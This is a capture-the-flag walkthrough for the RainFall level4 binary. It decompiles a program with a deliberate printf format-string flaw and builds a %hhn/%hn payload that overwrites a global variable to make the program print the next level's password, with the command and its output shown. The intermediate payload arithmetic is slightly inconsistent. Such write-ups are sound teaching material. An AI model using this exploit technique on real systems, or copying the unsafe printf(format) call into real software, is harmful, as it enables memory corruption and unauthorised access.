
# Source Code

<table  style="margin: 0 auto;">
  <tr>
    <th>Assembly Code</th>
    <th>its equivalent in C Code</th>
  </tr>
  <tr>
    <td>
      <pre><code class="language-asm">
Dump of assembler code for function main:
   0x080484a7 <+0>:     push   ebp
   0x080484a8 <+1>:     mov    ebp,esp
   0x080484aa <+3>:     and    esp,0xfffffff0
   0x080484ad <+6>:     call   0x8048457 n
   0x080484b2 <+11>:    leave
   0x080484b3 <+12>:    ret

Dump of assembler code for function n:
   0x08048457 <+0>:     push   ebp
   0x08048458 <+1>:     mov    ebp,esp
   0x0804845a <+3>:     sub    esp,0x218
   0x08048460 <+9>:     mov    eax,ds:0x8049804
   0x08048465 <+14>:    mov    DWORD PTR [esp+0x8],eax
   0x08048469 <+18>:    mov    DWORD PTR [esp+0x4],0x200
   0x08048471 <+26>:    lea    eax,[ebp-0x208]
   0x08048477 <+32>:    mov    DWORD PTR [esp],eax
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    eax,[ebp-0x208]
   0x08048485 <+46>:    mov    DWORD PTR [esp],eax
   0x08048488 <+49>:    call   0x8048444 p
   0x0804848d <+54>:    mov    eax,ds:0x8049810
   0x08048492 <+59>:    cmp    eax,0x1025544
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    mov    DWORD PTR [esp],0x8048590
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave
   0x080484a6 <+79>:    ret

Dump of assembler code for function p:
   0x08048444 <+0>:     push   ebp
   0x08048445 <+1>:     mov    ebp,esp
   0x08048447 <+3>:     sub    esp,0x18
   0x0804844a <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x0804844d <+9>:     mov    DWORD PTR [esp],eax
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
   0x08048455 <+17>:    leave
   0x08048456 <+18>:    ret
      </code></pre>
    </td>
    <td>
      <pre><code class="language-c">
int m;

void p(char *format)
{
  printf(format);
}

void n()
{
  char buffer[520];

  fgets(buffer, 512, stdin);
  p(buffer);
  if ( m == 16930116 )
    system("/bin/cat /home/user/level5/.pass");
}

int main()
{
  n();
}
      </code></pre>
    </td>
  </tr>
</table>

# Exploring
like level before, there is no buffer overflow, but `printf` format string there is.

So, our goal is modify the value of `m` to `16930116`, mean printf shall print `16930116` character.

`16930116` (around of 17 million character) needs to be printed, this amount of chars take a long time to be printed, also `printf` posibility fail before complete.

We need some trick bypass the limitation.

---
In C's `printf`, the `%n` specifier writes the number of characters printed so far into a variable you provide. The **h** and **hh** modifiers tell `printf` the size of that variable:

- **%hn**: Expects a pointer to a **short int**. This means the character count is stored as a short integer.
- **%hhn**: Expects a pointer to a **signed char**. Here, the count is stored in a signed char, which is smaller than a short int.

**Alternative phrasing:**  
- Using `%hn` means you're telling `printf` to write the count into a variable of type `short int`.
- Using `%hhn` means you're instructing it to store the count into a variable of type `signed char`.
---

from this hint, what about write byte by byte on `m` address.

the value of `m` to shall override is `16930116`, on binary is:

```
      00000001      00000010      01010101     01000100   =  16930116

m  0            1              2             3
   ┌─────────────────────────────────────────────────────┐
   |  00000001  |   00000010   |  01010101   | 01000100  | -->  binary representation
   |─────────────────────────────────────────────────────|
   |     1      |      2       |     85      |    68     | -->  decimal representation for each byte
   └─────────────────────────────────────────────────────┘
```

in little-endian:

```
m   0            1              2             3
    ┌─────────────────────────────────────────────────────┐
    |  01000100  |   01010101   |  00000010   | 00000001  |
    |─────────────────────────────────────────────────────|
    |     68     |      85      |      2      |     1     |
    └─────────────────────────────────────────────────────┘
```

what about combining the last two bytes (`signed char`) `2, 3` into one `short int`.

```
m   0            1              2             
    ┌─────────────────────────────────────────────────────┐
    |  01000100  |   01010101   |    00000010 00000001    |
    |─────────────────────────────────────────────────────|
    |     68     |      85      |           513           |
    |─────────────────────────────────────────────────────|
    |    %hhn    |     %hhn     |           %hn           | --> printf specifier equivalent
    └─────────────────────────────────────────────────────┘
```

Since we combine two bytes, we shall switch the them `00000010 00000001` -> `00000001 00000010` (due little-endian).

`00000001 00000010` is equivalent to `258` in decimal.


```
m   0            1              2             
    ┌─────────────────────────────────────────────────────┐
    |  01000100  |   01010101   |    00000001 00000010    |
    |─────────────────────────────────────────────────────|
    |     68     |      85      |           258           |
    |─────────────────────────────────────────────────────|
    |    %hhn    |     %hhn     |           %hn           | --> printf specifier equivalent
    └─────────────────────────────────────────────────────┘
```


# Exploiting
 We will start writing bytes from lower to higher `68` -> `85` -> `258` which is the addresses are `0`, `1` then `2`.
 
 So, first shall print `68` char, then `17` (`85 - 68`: 68 already written) and `173` (`258 - 85`: 85 already written).

The payload format be like.

```
%68x%00$hhn%17x%01$hhn%428x%02$hn..padding..000011112222
```

`0000`: address of m+0

`1111`: address of m+1

`2222`: address of m+2

`padding`: shall find


```
%08x%00$08x%08x%01$08x%008x%02$8x.000011112222
     ^^
```

By run this test and adjust the `00` that's represent number of arg position to match `0000`, we can find the arg and padding needed.

```
level4@RainFall:~$ echo '%08x%21$08x%08x%01$08x%008x%02$8x...000011112222' | ./level4
                              ^^                          ^^^
                           arg-index                    padding
b7ff26b031313131bffff764b7ff26b0b7fd0ff4bffff764...000011112222
        ^^^^^^^^
        0000 in hex
```


We found that `0000` comes on `21st` argument, mean `1111` on `22st` and `2222` in `23st`. the padding is tree dots `...`.

So, the payload is:

```
%68x%21$hhn%17x%22$hhn%173x%23$hn...<m-addr+0><m-addr+1><m-addr+2>
```

From this line of asm `   0x0804848d <+54>:  mov   eax,ds:0x8049810` the address om is `0x8049810`.

`0x8049810 + 0`: `0x8049810` -> `\x10\x98\x04\x08`

`0x8049810 + 1`: `0x8049811` -> `\x11\x98\x04\x08`

`0x8049810 + 2`: `0x8049812` -> `\x12\x98\x04\x08`

The final payload:
```
%68x%21$hhn%17x%22$hhn%173x%23$hn...\x10\x98\x04\x08\x11\x98\x04\x08\x12\x98\x04\x08
```

Finally:
```
level4@RainFall:~$ (echo -n '%68x%21$hhn%17x%22$hhn%173x%23$hn...'; printf '\x10\x98\x04\x08\x11\x98\x04\x08\x12\x98\x04\x08\n') | ./level4
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

We get the password, see you in the next level `level5`.
